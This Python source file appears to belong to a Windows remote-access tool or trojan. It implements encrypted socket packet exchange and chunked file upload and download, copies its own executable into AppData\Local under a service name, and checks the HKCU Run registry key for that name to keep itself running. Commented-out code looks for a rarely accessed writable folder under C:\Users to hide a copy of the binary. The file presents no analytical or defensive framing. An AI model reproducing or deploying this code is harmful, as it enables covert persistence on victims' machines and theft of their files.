from tools.packet_manager import *
from tools.cipher import *
from tools.dictionary import *
from tools.exception_handler import exception_handler
from os.path import basename
from shutil import copyfile
from win32api import MoveFileEx
import winreg
import win32con
import sys
import time
import json
import os
import random

def packet_send(command, payload, cipherClass, conn, encrypt=True):
    delay = SEND_DELAY
    pm = p_manager(cipherClass)
    pm.store_command(command)
    pm.store_payload(payload)

    if encrypt == True:
        pm.encrypt_packet()

    for i in pm.get_packets():
        length = len(i)
        length = "{0:04d}".format(length).encode()
        data = length + i
        retry = 0
        while(True):
            try:
                length_sent = conn.send(data)

                if length_sent != int(length)+4:
                    print(length_sent, int(length)+4)
                    # Add warning or resend
                break
            except Exception as e:
                exception_handler(e)
                retry += 1
                print("Retried")
                time.sleep(SEND_DELAY)
                if (retry >= 5):
                    break
                continue
        time.sleep(SEND_DELAY)

    del pm
    return True

def packet_recv(cipherClass, conn, decrypt=True, leftovers=b''):

    def get_recv(conn, leftovers):

        response = conn.recv(MAX_SOCK_RECV)

        if response == b'':
            raise Exception("Socket closed")
        
        response = leftovers + response

        if len(response) == 0:
            print(response)

        length = int(response[0:4].decode())

        data = response[4:4+length]
        leftover = response[4+length::]

        while(length > len(data)):
            data += conn.recv(length-len(data))

        return data, leftover

    pm = p_manager(cipherClass)
    
    data, leftovers = get_recv(conn=conn, leftovers=leftovers)
    
    try:
        pm.load_packet(data)
    except Exception as e:
        exception_handler(e)
        raise Exception("Error loading packet")

    while pm.is_last() == False:
        data, leftovers = get_recv(conn=conn, leftovers=leftovers)       
        pm.concat(data)
    if decrypt == True:
        pm.decrypt_packet()
    return pm.packet, leftovers

def file_send(filename, sending_queue):

    BYTES_TO_READ = 100
    MAX_BYTES_PER_PACKET = 10000

    count = 1
    start = True
    read_bytes = b''
    new_bytes = b''
    action = "CREATE"

    try:
        file = open(filename, "rb")

        read_bytes = file.read(BYTES_TO_READ)
        new_bytes = read_bytes
        while (True):
            count += 1
            new_bytes = file.read(BYTES_TO_READ)
            read_bytes += new_bytes

            if (count*BYTES_TO_READ >= MAX_BYTES_PER_PACKET or new_bytes == b''):
                count = 0
                action = "CREATE" if start == True else "APPEND"
                start = False

                ftp_payload = {}
                ftp_payload["FNAME"] = filename
                ftp_payload["ACT"] = action
                ftp_payload["FILE"] = read_bytes.hex()

                packet = {}
                packet[PK_COMMAND_FLAG] = "FTP"
                packet[PK_PAYLOAD_FLAG] = ftp_payload
                sending_queue.put(packet)

                read_bytes = b''

                if new_bytes == b'':
                    break

    except Exception as e:
        raise e
    finally:
        file.close()


def file_recv(packet):
    ftp_payload = json.loads(packet[PK_PAYLOAD_FLAG])
    filename = basename(ftp_payload["FNAME"])

    try:
        if ftp_payload["ACT"] == "CREATE":
            file = open(filename, "wb")
        else:
            file = open(filename, "ab")

        payload = bytes.fromhex(ftp_payload["FILE"])
        file.write(payload)
        file.close()
        return True
    except Exception as e:
        exception_handler(e)
        return False
    finally:
        file.close()

# def is_writable(folder_name):
#     try:
#         print(folder_name)
#         t_file_name = str(random.randint(1,1))

#         with open(folder_name + "\\" + t_file_name, 'wb') as f:
#             f.write(b' ')
#         os.remove(t_file_name)
#         print(folder_name)
#         return True
#     except Exception as e:
#         return False

def copy_transfer():
    file_path = os.getcwd()
    file_name = os.path.basename(sys.argv[0])

    path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)
    try:
        if os.path.exists(path) == False:
            os.makedirs(path)
        copyfile(os.getcwd()+"\\"+file_name, path +"\\"+file_name)
        return path
    except:
        return False

def check_key(key_path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", access=winreg.KEY_READ)
    try:
        count = 0
        while(True):
            val, path, data_type = winreg.EnumValue(key, count)
            if val == SERVICE_NAME:
                return True
            count += 1
    except:
        return False
    finally:
        winreg.CloseKey(key)

    # file_path = os.getcwd()
    # abs_path = "C:\\Users" #"C:\\Program Files (x86)"
    # file_name = os.path.basename(sys.argv[0])

    # chosen = None
    # while(True):
    #     for file in os.listdir(abs_path):
    #         current_file = abs_path + "\\" + file

    #         if (os.path.isdir(current_file) == True and is_writable(current_file) == True):
    #             current_stats = os.stat(current_file)
    #             if isinstance(chosen, dict) == False or (chosen['STATS'].st_atime > current_stats.st_atime):
    #                 chosen = {}
    #                 chosen['FILENAME'] = current_file
    #                 chosen['STATS'] = current_stats


    #     if chosen == None:
    #         break

    #     abs_path = chosen['FILENAME']
    #     chosen = None
    # print(abs_path)

    # try:
    #     file = open(os.getcwd()+"\\"+file_name, "rb")
    #     data = file.read()
    #     file.close()

    #     with open(abs_path+"\\"+file_name, "wb") as new_file:
    #         new_file.write(data)

    #     # copyfile(os.getcwd()+"\\"+file_name, abs_path+"\\"+file_name)
    #     return True
    # except Exception as e:
    #     exception_handler(e)
    #     return False

